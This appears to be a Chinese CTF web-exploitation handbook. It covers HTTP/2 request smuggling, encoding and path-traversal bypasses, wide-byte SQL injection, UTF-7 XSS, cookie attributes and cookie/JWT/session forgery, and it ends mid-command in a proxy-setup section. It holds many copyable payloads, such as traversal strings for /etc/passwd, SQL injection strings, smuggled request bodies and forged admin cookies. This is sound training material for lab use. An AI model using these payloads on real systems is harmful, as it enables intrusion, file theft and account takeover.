## [smuggling] 请求走私与协议攻击——前后端对 HTTP 解析不一致导致的协议层漏洞。
### [h2-smuggling] HTTP/2 降级与走私变体 | hard | 请求走私;HTTP/2;协议攻击 | h2降级;h2c走私;http2走私
> HTTP/2 特有的走私与降级攻击
#### 这个条目的作用
HTTP/2 请求本身是按「帧」定界的，不存在 CL/TE 头冲突；但当**前端（网关/负载均衡）支持 HTTP/2、后端源站只支持 HTTP/1.1** 时，网关要把 h2 请求翻译成 h1 转发，翻译过程就可能产生和经典走私一样的边界歧义。本条教你判断目标是否走 h2、认清降级点在哪儿，并掌握 h2 特有的几种走私/注入姿势。
#### 前置条件
- 会看响应行：`HTTP/2 200` 表示你这条连接确实用了 h2。
- curl 8.x 及以上默认对支持 h2 的站点自动协商；`curl --http2-prior-knowledge` 可强制。
- 经典 CL/TE 走私原理（见 smug-basics / smug-clte 条目）。
- 靶场/自己搭建的题目环境（走私类测试严禁打在真实公网服务上）。
#### 第 1 步：判断目标走不走 HTTP/2
操作：用 curl 显式协商 h2，观察响应行。
```bash
curl --http2 -v https://target/ 2>&1 | head -20
# 关键输出：* using HTTP/2（协商成功）；响应首行 HTTP/2 200
```
预期结果：响应行是 `HTTP/2 200` 而不是 `HTTP/1.1 200 OK`，说明前端支持 h2。
如果不行：`curl: (16) HTTP/2 stream 0 was not closed cleanly` 等报错说明服务端 h2 配置异常；用 `curl -sI https://target/` 看 `Server` 头猜测前端类型（如 `cloudflare`、`nginx`、`envoy`）。另外 h2 只在 HTTPS(ALPN) 或 h2c(明文升级)下存在，纯 http:// 大多是 h1。
#### 第 2 步：认清「降级」歧义从哪来
操作：理解翻译链路——前端按帧解析 h2，转发给后端的却是 h1 文本。
```txt
浏览器 ──h2 帧──> 网关 ──h1 文本──> 后端源站
```
预期结果：知道歧义点只有两类——
1. h2 请求里**人为塞进** `content-length` / `transfer-encoding` 头，后端 h1 解析时当边界用；
2. h2 头值里**塞 `\r\n`**，翻译成 h1 时被当成新行/新头。
如果不行：先忘掉帧格式，只记「后端是 h1，所以 h1 的规则(CL/TE/CRLF)在后端照样生效」，歧义就出在网关翻译时没拦掉这些头。
#### 第 3 步：H2.CL 走私（content-length 与帧长度冲突）
操作：h2 请求带一个与帧体长度不一致的 `content-length` 头。Burp 里切到 HTTP/2 标签改请求，或用支持 h2 的客户端发原始 h2 帧。
```http
:method = POST
:path = /
:authority = target
content-length: 5

<帧体实际 6 字节：XGET /admin HTTP/1.1\r\nHost: target\r\n\r\n >
```
预期结果：网关按帧长 6 字节转发，后端按 `content-length: 5` 只读 5 字节，剩下 `GET /admin...` 变成**下一个请求的开头**——这就是 h2 版的 CL 走私。
如果不行：很多网关会剥掉或改写 content-length，先小尺寸试（帧体比 CL 多 1 字节 + 一个 GET 头），看下一个正常请求的响应里是否混入被走私请求的响应。
#### 第 4 步：H2.TE 走私
操作：h2 请求里直接带 `transfer-encoding: chunked` 头，后端按 h1 的 chunked 规则解析。
```http
:method = POST
:path = /
:authority = target
transfer-encoding: chunked

<帧体：0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\nX: X\r\n\r\n>
```
预期结果：后端读完 chunk 终止符 `0` 后，剩余部分被当作下一个请求 → 走私成功。
如果不行：与 H2.CL 一样先探测「时间差」——走私请求后紧跟一个正常请求，若该请求响应明显变慢或返回异常（被拼接），说明歧义存在。
#### 第 5 步：H2 头注入（CRLF / 请求拆分）
操作：往 h2 的某个头值里塞 `\r\n`，翻译成 h1 时被拆成多行。
```http
x: a\r\nGET /admin HTTP/1.1\r\nHost: target
```
预期结果：后端 h1 解析时把 `GET /admin HTTP/1.1` 当成新请求行，造成请求拆分；也可以注入新响应头（响应头注入）配合缓存投毒。
如果不行：部分网关会拒绝含 CR/LF 的头值（直接 400 或被剥离）。测前先随便塞个 `\r\nX-Test: 1`，响应里出现 `X-Test: 1` 就说明没过滤，再上真 payload。
#### 第 6 步：区分 h2c 走私与常规 h2 走私
操作：记住两种常见表述——**h2（h2c）走私**指通过 h2/h2c 通道做的走私；h2c 是明文 HTTP/2（`Upgrade: h2c`），多出现在内网代理/反代场景。
```bash
# 探测 h2c：curl 带 Upgrade 头
curl -v --http2 http://target/ -H 'Connection: Upgrade, HTTP2-Settings' \
     -H 'Upgrade: h2c' -H 'HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA'
# 响应 101 Switching Protocols → 服务端接受 h2c
```
预期结果：知道 h2c 走明文 80 端口、无 TLS，证书那套完全无关；抓到 `101` 说明可以在这条连接上继续做前面第 3~5 步的注入。
如果不行：多数公网前端不支持 h2c，返回普通 200 即可，别浪费时间。
#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 响应行一直是 `HTTP/1.1` | 前端根本不用 h2，或 curl 未协商成功 | 检查是否 https + ALPN；`curl --http2 -v` 看协商日志 |
| 走私 payload 发了没反应 | 网关剥掉了 CL/TE 头，或字符被转义 | 换 H2 头注入路数；用 Burp HTTP/2 面板确认头真实到达后端 |
| 下一个请求响应混乱但时序稳定 | 走私目标选错（打到了自己独占的连接） | 用两个并发连接：一个发走私，一个发正常请求，看正常请求是否被污染 |
| 请求被网关 400 拒绝 | 头值含裸 CR/LF 被直接拦截 | 换其他头位、减小 payload、或改走 H2.CL/H2.TE 变体 |

#### 实战要点
- 先 `curl --http2 -v` 确认走 h2 再动手，否则按经典 h1 走私做。
- h2 走私的核心不是帧格式，而是「后端只认 h1」——CL/TE/CRLF 规则原样生效。
- 判断工具：Burp 免费版的 HTTP/2 支持 + `http-request-smuggler` 扩展；命令行用 curl `--data-binary` 传二进制体。
- 线下赛 h2 走私整体偏少，遇到优先试 H2 头注入（CRLF），成本最低、见效最快。
- 一律只在靶场/自建环境测试，走私会把请求拼给真实用户。
## [encoding] 编码与解析差异——目录/参数/路径解析的编码绕过知识。
### [encoding-tricks] URL 编码与解析差异绕过 | medium | 编码;路径绕过;解析差异 | 双重编码;路径规范化;目录穿越编码
> 各种编码/规范化差异导致的 WAF 与路径绕过
#### 这个条目的作用
同一个字符串，浏览器、WAF、反代、后端应用可能各自解码一次或多次，且对 `../`、`/`、`\`、`.` 的规范化规则不同。这种不一致就是绕过 WAF 规则、绕路径鉴权、穿越目录的入口。本条教你从「解码链有几层」出发，系统地生成编码变体并验证哪一层放行。
#### 前置条件
- 会用 curl 发原始请求：`curl -i 'http://target/path'`。
- 记得基础 hex 映射：`.`=%2e、`/`=%2f、`\`=%5c、`%`=%25。
- 一个能看响应状态码/内容的终端（200 与 403 的差异就是判断依据）。
#### 第 1 步：确认解码链有几层
操作：先发一个编码后的路径，看它**最终**被解码成什么。
```bash
# 三层编码的 /：%25 是 %，%2f 是 /
curl -i 'http://target/..%252f..%252fetc%252fpasswd'
```
预期结果：如果返回 200 且是 /etc/passwd 内容 → 后端（如 Tomcat 类）解码了两层；若 404/403，则把编码层数减一（`..%2f`）再加一（`%25252f`）逐个试。
如果不行：别只看状态码，配合 `-i` 看 `Server`/`X-Powered-By` 头猜栈（Tomcat/Spring/IIS/Nginx），不同栈的解码层数习惯不同。
#### 第 2 步：目录穿越变体逐个喂
操作：把 `../` 换成下列常见形态，逐个替换路径再发。
```txt
../           ..%2f        %2e%2e%2f
..%252f      %252e%252e%252f
..%c0%af     ..\         .%2e/
%2e%2e%5c    %u002e%u002e   (仅 IIS 旧版)
....//       ....//....//   (过滤 . 后双写)
..././       ..;/          (Servlet 路径参数)
```
```bash
curl -i 'http://target/..%2f..%2fetc%2fpasswd'
curl -i 'http://target/%2e%2e%2fetc/passwd'
curl -i 'http://target/....//....//etc/passwd'
```
预期结果：某一条返回 200/文件内容，绕过了 WAF 或路径检查。
如果不行：记忆优先顺序 `../` → `..%2f` → `..%252f` → `%2e%2e%2f` → `..\` → 双写 `....//`，配合返回码差异取舍；全部 403 说明 WAF 拦的是解码后的路径，往「规范化差异」走。
#### 第 3 步：利用大小写与特殊字符绕过黑名单
操作：黑名单常只匹配小写/精确串，试着变形关键词所在的部分。
```bash
curl -i 'http://target/..%2F..%2Fetc/passwd'   # %2F 大写 hex
curl -i 'http://target/..%ef%bc%8f..'          # 全角斜杠 U+FF0F
curl -i 'http://target/..%5c..%5c'             # 反斜杠（IIS/Windows 栈）
```
预期结果：`%2F`、全角、反斜杠中至少一种被服务端**原样透传**或错误地规范化成 `/`，从而命中目标文件。
如果不行：这是典型的「试错型」绕过，一次批量多形态一起发，看哪个返回码/响应体变化，不必每发一次就人工分析。
#### 第 4 步：利用路径规范化差异（Nginx / Servlet / IIS）
操作：针对不同栈使用其特有的规范化特性。
```txt
Nginx alias 拼接：location /files/ { alias /var/www/; }
  → 请求 /files/../etc/passwd 实际拼成 /var/www/../etc/passwd
Nginx 畸形 URI：/files../etc/passwd（merge_slashes 归一并落）
Tomcat/Spring：/admin;.css   → 后缀检查被 ; 后面的内容骗过
IIS 旧版：      /admin.asp;.jpg → 前面截断执行
```
```bash
curl -i 'http://target/files../etc/passwd'
curl -i 'http://target/admin;.css'
```
预期结果：`alias` 拼接环境下 `/files/../etc/passwd` 直接读文件；`/admin;.css` 通过后缀白名单却仍命中 admin 路由。
如果不行：先读目标 `Server` 头确认栈再选变体；Nginx alias 穿越需要 `location` 配置成 alias 而非 root，不是所有 /files 都适用。
#### 第 5 步：配合路径鉴权绕过（X-Original-URL 思路）
操作：前端按明文路径鉴权、后端按规范化后路径路由时，用「前端不认、后端认」的写法把真实路径藏在参数或特殊后缀后面。
```bash
# 若后端仅按 URL 前缀鉴权：请求 /admin/xxx 被 403，试
curl -i 'http://target/../admin/'
curl -i 'http://target/%61dmin/'            # admin 字母 URL 编码
```
预期结果：403 变 200 —— 说明鉴权中间件对编码/点路径的处理和后端业务不一致。
如果不行：换用 `X-Original-URL: /admin` 头（见 http-headers 条目），它绕过路径鉴权但不改可见 URL，是更稳的路子。
#### 常用失败原因排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 所有变体都 404 | 后端根本没这个路径，不是被 WAF 拦 | 先用普通 `../` 确认目录穿越本身存在 |
| 所有变体都 403 | WAF 拦的是「解码后」的路径 | 走规范化差异/路径参数，别硬刚编码 |
| 返回 400 | 未编码的非法字符（`%c0%af` 等超长字节）被拒 | 现代栈已修复过宽编码，换 `%u`/全角/路径参数 |
| curl 报编码错误 | shell 里 `#`、`&` 等被解释 | 整个 URL 用单引号包裹 |

#### 实战要点
- 先把「解码链层数」测出来，变体才有目标；层数不对再怎么试都是白费。
- 一条命令一次发多个变体（shell 循环），看返回码分组，别一条条人工看。
- `..\` 与 `....//` 分别对应 Windows 栈与「过滤点号型」WAF，是高频命中项。
- 鉴权中间件与业务层不一致才是这类题的核心：403 与 404 的区分比 payload 本身更重要。
- 所有路径编码绕过测试在题目环境里做，真实站点可能把请求打到内网文件。
### [charset-issues] 字符集与编码陷阱 | medium | 编码;字符集;宽字节;UTF-7 | 宽字节注入;gbk;utf-7 xss;字符编码漏洞
> 宽字节注入、UTF-7 XSS 等字符集相关漏洞
#### 这个条目的作用
当数据库连接、页面编码与过滤逻辑对「同一串字节」的理解不一致时，会出现宽字节注入（转义符被吃掉）、UTF-7 XSS（关键字绕过过滤）这类字符集漏洞。本条用最直白的方式讲清原理，并给出可复制的验证 payload。
#### 前置条件
- 知道 URL 编码：`'`=%27、`\`=%5c、`<`=%3c、`>`=%3e。
- 能发 curl 请求、能看响应文本。
- 一个老版本 MySQL + GBK 连接环境的靶题（宽字节部分需要）。
#### 第 1 步：理解宽字节注入的原理
操作：把转义流程画一遍——后端用 `addslashes`/`mysql_real_escape_string` 把单引号转成 `\'`，但**在 GBK 字符集下**，`\`（%5c）会与前一个字节拼成一个宽字符。
```txt
输入 %df'        → 转义后变成 %df%5c%27
GBK 解码：%df%5c 被拼成汉字「運」，%27 变成裸单引号 → SQL 逃逸
```
预期结果：知道「转义符还在，只是被前面的字节‘吃掉’组成了汉字」，所以单引号逃逸成功。关键前提：**数据库连接的字符集是 GBK 等宽字节集**，且输入未经 utf8 转换。
如果不行：误以为「宽字节」是编码 payload 就能用——实际它依赖服务端连接字符集配置，现代默认 utf8mb4 的环境直接无效。
#### 第 2 步：宽字节注入实操验证
操作：对可控参数注入，先做布尔/报错验证。
```sql
-- 经典：%df' 让单引号逃逸，再用 or 构造恒真
?id=1%df%27%20or%201=1--%20
```
```bash
curl -i 'http://target/?id=1%df%27%20or%201=1--%20'
curl -i 'http://target/?id=1%df%27%20and%201=2--%20'   # 对照
```
预期结果：恒真版与恒假版返回内容不同（或不报错/报错），说明单引号已逃逸、SQL 可控，可继续 union 注入。
如果不行：两份响应完全一样 → 字符集不是宽字节或参数不是数字型拼接；先翻题目信息看是否 MySQL 老版本 + GBK，别硬套。
#### 第 3 步：识别 UTF-7 编码 XSS 场景
操作：老浏览器按响应中的 `Content-Type: text/html; charset=UTF-7`（或历史 IE 的编码推断）解码时，`+ADw-` 会被还原成 `<`。
```txt
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
解码后：<script>alert(1)</script>
```
预期结果：服务端过滤了 `<script>` 关键字，但响应里声明/推断的字符集是 UTF-7（或老环境可被诱导），payload 绕过过滤后被解码执行。
如果不行：现代浏览器（Chrome/Firefox 近十年）已默认禁用 UTF-7，多数情况评论框直接显示原文字符——这是历史老题，先确认题目环境年代再投入时间。
#### 第 4 步：用字符规范化差异绕过滤
操作：把被黑名单限制的关键字做大小写/全角/空白替换，逐个喂。
```txt
大小写：pHP、SeLeCt           （黑名单只匹配小写）
全角  ：／、ｓｅｌｅｃｔ       （U+FF0F、U+FF45 系）
空白  ：%09、%0a、%0d 替代空格 （WAF 正则里的 \s 常只认空格）
空字节：%00 （老 PHP 字符串截断，现已废弃，别当首选）
```
```bash
curl -i 'http://target/search?q=%3CpHP%3E'         # <pHP> 大小写
curl -i 'http://target/search?q=a%09or%091=1'      # 制表符替代空格
```
预期结果：某一形态被目标**原样透传**且语义保留（pHP 仍解析为 php 标签、%09 仍被 SQL 当空白），从而绕过关键字黑名单。
如果不行：先确认黑名单匹配的是解码前还是解码后；把这四种形态一次性批量发送，看哪种返回码/响应不同再深挖。
#### 第 5 步：全局验证技巧——「哪个形态被原样透传」
操作：任何字符集/规范化疑难都用一个回显点做对照实验——输入一串特征字符，看响应里它的形态。
```bash
curl -i 'http://target/echo?x=%ef%bc%8f'   # 全角斜杠
curl -i 'http://target/echo?x=%c0%ae'       # 过宽字节
# 响应里搜这串字节，看是原样、被转义、被解码还是被丢弃
```
预期结果：找到「被原样透传」的形态 = 找到绕过通道；被转义/被丢弃的形态直接放弃。
如果不行：若所有形态都被转义或丢弃，说明该环境字符集统一且无解析差异，这条思路到头，换业务逻辑漏洞。
#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| `%df'` 打进去毫无反应 | 连接字符集不是 GBK（现代 db 默认 utf8mb4） | 确认题目环境；宽字节是历史题，别硬试 |
| UTF-7 payload 显示为明文 | 现代浏览器默认禁用 UTF-7 | 确认题目年代；放弃或换编码注入 |
| 大小写绕过失败 | WAF 先 `strtolower` 再匹配 | 换全角/空白/%09 形态 |
| 响应乱码 | 页面声明字符集与内容不符 | 看 `Content-Type` 的 charset；乱码本身就是「字符集不一致」的线索 |

#### 实战要点
- 三条线独立存在：宽字节注入（SQL 侧）、UTF-7 XSS（浏览器侧）、规范化绕过（通用侧），别混为一谈。
- 宽字节的前提是**数据库连接字符集**，不是页面 `<meta charset>`，先看后端配置。
- 「原样透传」实验是通用方法论：先找透传形态，再谈利用。
- 字符集类题在 CTF 里逐年变少（现代栈统一 UTF-8），遇到先估年代，别耗时过长。
- 所有 payload 保持 URL 编码发送到题目环境，避免本地 shell 转义干扰。
## [cookie] Cookie 与 Session——会话机制与伪造思路。
### [cookie-attrs] Cookie 属性速查 | easy | Cookie;会话;安全属性 | cookie属性;httponly;samesite
> Set-Cookie 各属性含义与安全影响
#### 这个条目的作用
看到 `Set-Cookie` 头就能判断这个站点的会话防护有多强：`HttpOnly` 管 XSS 能不能偷、`SameSite` 管 CSRF 能不能打、`Secure` 管明文网络里会不会被嗅探。本条把每个属性的含义、缺失后果和验证方法讲透。
#### 前置条件
- 会抓包或看响应头：`curl -i`、浏览器 DevTools Network 均可。
- 知道 Cookie 是浏览器自动带在请求头里的键值对（`Cookie: session=abc`）。
#### 第 1 步：看响应里的 Set-Cookie 头
操作：请求一个需要登录/设置的页面，看响应头。
```bash
curl -i -c cookies.txt 'http://target/login.php' -d 'user=admin&pass=admin'
# 响应里找：Set-Cookie: session=xxxx; HttpOnly; Path=/; SameSite=Lax
```
预期结果：能逐项读出该会话 cookie 的**属性清单**——缺了哪个属性，哪个防护就缺位。
如果不行：登录接口可能跳转（302），加 `-L` 或先访问首页拿初始 cookie；部分站用 JS 写入 cookie（`document.cookie=...`），响应头里没有，需看前端代码。
#### 第 2 步：HttpOnly —— XSS 能不能偷会话
操作：判断依据只有一个：`Set-Cookie` 里有没有 `HttpOnly`。
```js
// 有 HttpOnly：document.cookie 里看不到会话 cookie（返回空或不含它）
// 没有 HttpOnly：XSS 里直接
alert(document.cookie);   // 或 fetch 回传
```
预期结果：`HttpOnly` 缺失 → 会话可在 XSS 中被读取，等于 XSS 直接升级为会话劫持；存在 → JS 拿不到，攻击者还要走别的路。
如果不行：注意浏览器 DevTools 的 Application 面板也能看到 HttpOnly cookie，但那是浏览器界面不是 JS——判定标准是 `document.cookie`，别用面板误判。
#### 第 3 步：SameSite —— CSRF 能不能打
操作：看 `SameSite` 的值，对照下表判断跨站请求是否携带本 cookie。
```txt
Strict  跨站 GET ✗  跨站 POST ✗   最安全
Lax     跨站 GET ✓(仅顶层导航) 跨站 POST ✗   Chrome 默认
None    跨站 GET ✓  跨站 POST ✓  必须配 Secure；有则 CSRF 敞口
未设置  新浏览器按 Lax；老浏览器行为如 None（老题可 CSRF）
```
```bash
curl -i -c cookies.txt 'http://target/login' | grep -i samesite
# 输出 SameSite=None → 跨站 POST 也带 cookie，CSRF 直接可测
```
预期结果：`SameSite=None`（或老环境未设置）→ 构造跨站表单/图片请求即可带会话 cookie 打 CSRF；`Strict` → 该路基本堵死。
如果不行：CSRF 打不通先检查是不是 SameSite=Lax + GET 以外的方法；Lax 下**顶层导航 GET** 仍带 cookie，部分场景仍可利用。
#### 第 4 步：Secure / Domain / Path / Expires 逐个核
操作：对每个属性问一句「它的作用域/失效条件是什么」。
```txt
Secure     仅 HTTPS 发送 → 缺失时，明文 HTTP 网络里 cookie 可见可改
Domain     作用域主机   → 设成 .example.com 太宽，子站都能收到该 cookie
Path       路径作用域   → 设成 / 过宽，所有路径都带
Expires/Max-Age 过期时间 → 长会话（几年不失效）扩大被窃后的利用窗口
```
预期结果：能对目标的 cookie 快速给出「防护评分」：Secure 缺失 + 站可 http 访问 → 可降级嗅探；Domain 过宽 → 子域名攻击面扩大。
如果不行：别把 `Domain` 和「网站域名」混了——Domain 只决定浏览器**往哪些主机发**，不决定登录态本身；没有跨子域需求时一般不必深究。
#### 第 5 步：综合判断会话防护等级
操作：把几步结论汇总成一句话——缺什么打什么。
```txt
缺 HttpOnly            → XSS 直接偷 session
SameSite=None          → CSRF 可打 POST 接口
缺 Secure 且站走 http   → 同网段嗅探/中间人改 cookie
Domain/Path 过宽        → 扩大所有上述攻击的生效面
全部齐全               → 会话层硬，转测业务逻辑/越权
```
预期结果：拿到目标 cookie 即刻得到攻击路线优先级，不再盲目堆 payload。
如果不行：记住「Cookie 属性只决定浏览器行为，决定不了服务端校验」——属性全绿不代表后端不信任前端传来的字段，那属于 cookie-forgery 的范畴。
#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| DevTools 能看到 HttpOnly cookie，以为没防护 | 面板≠JS，`document.cookie` 为准 | 用 console 执行 `document.cookie` 复核 |
| SameSite 没写却认为绝对安全 | 新浏览器默认 Lax 只是默认，老浏览器不同 | 按题目环境年代判断；None/Lax 都试 CSRF |
| curl 登录后 cookie 没存下来 | 没用 `-c/-b` 或加了 `-L` 被重定向丢 cookie | `curl -c jar -b jar -L` 组合使用 |
| Secure 缺失但站只走 https | 攻击面小，别高估 | 看题目是否允许 http 明文访问 |

#### 实战要点
- 看到 `Set-Cookie` 先扫三个词：`HttpOnly`、`SameSite=None`、`Secure`，缺哪个打哪条线。
- CSRF 的判定只看 SameSite，与 Cookie 是否 HttpOnly 完全无关（HttpOnly 管读取，SameSite 管携带）。
- 老题环境（未设 SameSite）是 CSRF 高发区，新题默认 Lax，习惯先试 POST 再试 GET。
- cookie 里出现多个同名键时，服务端取第一个还是最后一个可能不一致（重复头解析差异），值得一测。
### [cookie-forgery] Cookie / Session 伪造与篡改 | medium | Cookie;会话伪造;序列化 | cookie伪造;session伪造;反序列化cookie
> 识别可预测/可篡改的会话凭据
#### 这个条目的作用
服务端把用户状态塞进 cookie 时，如果没做签名/完整性校验，攻击者改一个字段就能提权成 admin。本条教你先**识别会话载体**（明文？签名？序列化？），再对号入座选篡改姿势。
#### 前置条件
- 会改请求再重放：Burp Repeater 或 curl `-b` 都行。
- 会用 `base64 -d` / Python `base64` 解码。
- 记得 PHP 序列化格式长什么样（`O:4:"User":2:{...}` 这种）。
#### 第 1 步：把 cookie 原文抓出来并分类
操作：登录后抓 `Cookie` 头，看它的「长相」判断类型。
```txt
明文可读 JSON/参数   → {"user":"admin","role":1} / user=admin&role=1
签名串（JWT）       → eyJhbGciOi... .eyJzdWIiOi... .signature（三段点号）
PHP 序列化          → O:4:"User":2:{s:4:"name";s:5:"admin";...}
32/64 位 hex        → md5/sha 摘要，如 098f6bcd4621d373...
自增/时间戳         → id=101、1680000000 这类可预测值
随机长串            → 服务端存储型（如 PHPSESSID=6f9a...）
```
预期结果：能把自己的会话 cookie 归入某一类——**分类决定攻击路线**。
如果不行：先从短的、肉眼可读的入手练：`user=admin` 这种格式一眼是明文，直接进入第 3 步。
#### 第 2 步：先试 base64 解码（最常见的坑）
操作：任何「读起来像乱码或 JSON 的字符串」都先解码看看。
```bash
echo 'eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoxfQ==' | base64 -d
# 输出：{"user":"admin","role":1}
```
预期结果：解出 JSON/参数 → 大概率是**裸 base64 未签名**，改字段、重新 base64、重放即可提权。
如果不行：base64 解出的是乱码（含 `\x` 二进制）→ 是序列化或加密数据；解出 `xxx.yyy.zzz` → 是 JWT，走第 5 步。
#### 第 3 步：明文参数直接改字段重放
操作：把能识别的字段改成管理员值，重新提交。
```txt
Cookie: user=1     → user=0 试管理员
Cookie: role=user  → role=admin
Cookie: isvip=0    → isvip=1；islogin=0 → 1
Cookie: id=13      → 遍历 id 撞别的用户
```
```bash
curl -i 'http://target/profile' -b 'user=0; role=admin; isvip=1'
```
预期结果：响应里出现管理员专属内容/接口放行 → 后端直接信任 cookie 字段，伪造成功。
如果不行：改完无变化 → 后端可能校验了签名或服务端另有状态；回第 1 步确认分类没错（例如只是**显示用**字段，会话靠 PHPSESSID）。
#### 第 4 步：序列化对象篡改（PHP 系）
操作：看到 `O:4:"User":...` 这类 PHP 序列化 cookie，精确改目标字段的值再原样重放。
```txt
原始：Cookie: auth=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"user";}
改后：Cookie: auth=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```
预期结果：改 `role` 字段后重放，接口按新角色授权 → 说明无完整性校验。
如果不行：响应提示反序列化失败（`unserialize(): Error` 或白屏）→ 你破坏了长度字段（`s:5:` 必须等于后面字符串字节数）；改值要同步改长度，用脚本生成：`python3 -c "print('O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}')"` 对着改。
#### 第 5 步：签名型（JWT / HMAC）的测试顺序
操作：三段点号串优先确认算法与密钥强度。
```bash
# 1) 头部 alg 改 none：将 alg 段改为 {"alg":"none"} 重算签名段留空
# 2) 弱密钥爆破（本地）：hashcat -m 16500 token.txt wordlist.txt
# 3) HS256 且密钥可猜（如 "secret"/"key"/空）时直接本地重签
```
预期结果：`alg:none` 被接受 → 直接重签任意 payload；密钥爆破成功 → 完整伪造；都失败 → 签名是强密钥，放弃本路线。
如果不行：注意 `alg:none` 时签名段必须是空串且头部没有多余空白，被拒是常态，先确认响应的报错是「签名校验失败」还是「格式错误」再判断方向。
#### 第 6 步：Session 固定 / 可预测 ID
操作：关注会话 ID 的静态性与随机性。
```txt
固定：登录前后 PHPSESSID 不变 → 先取一个受害者 ID，诱导其用它登录，再复用
可预测：session_id 由时间戳/简单拼接生成 → 观察几次取值找规律，预测下一个
```
预期结果：ID 不变 → session 固定攻击成立；ID 有规律 → 可枚举/预测，直接构造合法会话。
如果不行：现代框架默认登录轮换 session ID，固定攻击大多失败；可预测型多出现在自研 session 的老题，先收集 5~10 个样本找模式（时间戳位、自增位）。
#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| base64 解开是乱码 | 是序列化/加密数据不是 JSON | 看 `O:`/`a:`/`s:` 前缀（PHP 序列化）转第 4 步 |
| 改了字段没效果 | 字段只是前端展示用，权限在服务端 | 换字段名盲试（role/isadmin/level）或转测越权接口 |
| JSESSIONID 改不动 | 服务端存储型会话，ID 只引用 | 走 session 固定/弱随机路线，别硬改 |
| PHP 反序列化报错 | 长度字段与值不匹配 | 改值必须同步改 `s:N:` 的 N |
| JWT alg:none 失败 | 库已禁用 none，或格式不对 | 转弱密钥爆破；HS 256 弱密钥多数题可本地重签 |

#### 实战要点
- 看到「读起来像 JSON 的乱码」**永远先 base64 -d**，超过半数题目就死在这一步。
- 分类定路线：明文→改字段；序列化→改字段+长度；JWT→none/爆破；随机串→固定/预测。
- 改字段时**一次只改一个**，方便定位哪条被后端信任。
- 加盐签名型 cookie 可收集多组「明文+签名」本地猜盐，但优先怀疑弱密钥（`secret`/`key`/`admin`）。
- PHP 反序列化 cookie 若带 magic 方法（`__wakeup` 等），篡改可能直接触发对象注入链——先当漏洞面记录，别急着触发。
## [traffic] 抓包与代理——把流量导进代理的三种方式（线下赛必备）。
### [capture-basics] 抓包代理设置（Burp / mitmproxy） | easy | 抓包;Burp;mitmproxy;代理 | burp代理;mitmproxy;127.0.0.1:8080;抓包设置
> 浏览器/命令行到代理的流量转发配置
#### 这个条目的作用
线下赛第一件事就是把目标流量导进代理，之后所有「改包、重放、看历史」都从这开始。本条覆盖三种方式——浏览器走 Burp、命令行 curl/python 走代理、无代理纯命令行直打，保证你 5 分钟内流量全部可视。
#### 前置条件
- 本机装好 Burp Suite（社区版足够）或 mitmproxy（`pip install mitmproxy`）。
- 知道代理默认监听 `127.0.0.1:8080`。
- 一个可访问的靶机地址。
#### 第 1 步：Burp 代理就绪并让浏览器走它
操作：Burp 默认监听 `127.0.0.1:8080`，把浏览器 HTTP(S) 代理指过去。
```txt
浏览器设置 → 代理 → 手动代理配置：
  HTTP 代理 127.0.0.1  端口 8080
  HTTPS 代理 127.0.0.1 端口 8080
（Firefox：设置→网络设置→手动配置代理；Chrome 可用 Proxy SwitchyOmega 扩展）
```
预期结果：浏览器访问任意 http 站点，Burp 的 Proxy → HTTP history 里实时出现请求。
如果不行：浏览器「无痕/隐私模式」不会自动读系统代理，需单独配置；访问 http 站点正常而 https 报证书错 → 不是代理问题，是证书没装，走第 2 步。
#### 第 2 步：装 Burp CA 证书（HTTPS 必须）
操作：浏览器走代理访问 `http://burp` 或 `http://127.0.0.1:8080`，点右上角下载 CA Certificate，导入系统受信任根。
```txt
Burp → Proxy → Options → Proxy Listeners → 勾选
访问 http://burp → 点 "CA Certificate" 下载 cacert.der
导入：系统证书库 → 受信任的根证书颁发机构 → 导入
（Windows 双击 cacert.der → 安装证书 → 本地计算机 → 受信任根）
```
预期结果：浏览器访问 https 站点不再报证书无效，Burp 里能看到明文 HTTPS 流量。
如果不行：浏览器仍报 `NET::ERR_CERT_AUTHORITY_INVALID` → 证书没装进「受信任根」或装错了库（装到个人库无效）；命令行工具暂时用 `curl -k` 跳过校验。
#### 第 3 步：命令行工具走代理（curl / python requests）
操作：不依赖浏览器，命令行流量也能进 Burp。
```bash
# curl 走代理（HTTPS 用 -k 跳过证书打扰，或指定 Burp 证书）
curl -x http://127.0.0.1:8080 -k http://target/
curl --proxy http://127.0.0.1:8080 -k https://target/

# python requests
# proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
# requests.get(url, proxies=proxies, verify=False)
```
预期结果：以上命令发出的请求全部出现在 Burp HTTP history 里，可继续 Repeater 重放。
如果不行：确认 Burp 还在监听（界面下方 Proxy 状态为 running）；`-k` 只是跳过证书校验，若仍报「connection refused」则端口/代理地址写错。
#### 第 4 步：mitmproxy 作为替代（命令行更友好）
操作：不想开 GUI 时用 mitmproxy，功能等价。
```bash
mitmproxy -p 8080    # 交互界面：上下键看请求，回车看详情
mitmdump -p 8080     # 纯打印模式，适合配合脚本/日志
```
```bash
# 让流量进来（与 Burp 同款姿势）
curl -x http://127.0.0.1:8080 -k https://target/
```
预期结果：mitmproxy 界面实时列出请求，可按过滤器（如 `~u /admin`）只看目标路径。
如果不行：mitmproxy 的 HTTPS 拦截首次访问会生成 `~/.mitmproxy/mitmproxy-ca-cert.pem`，浏览器装这个根证书；命令行配 `--ssl-insecure` 可跳过。
#### 第 5 步：无代理时纯命令行快速复用
操作：题目不需要长期挂着代理时，直接用 curl 打原始请求（-i 看响应头、-b 带 cookie、-d 带 POST 体）。
```bash
# 带响应头 + POST 表单 + 存/带 cookie
curl -s -i -c jar.txt -b jar.txt 'http://target/login.php' -d 'user=admin&pass=123'

# Burp 里 Copy as cURL 直接粘贴执行（携带全部头）
curl -s -i -X 'POST' 'http://target/' -H 'Cookie: session=abc' \
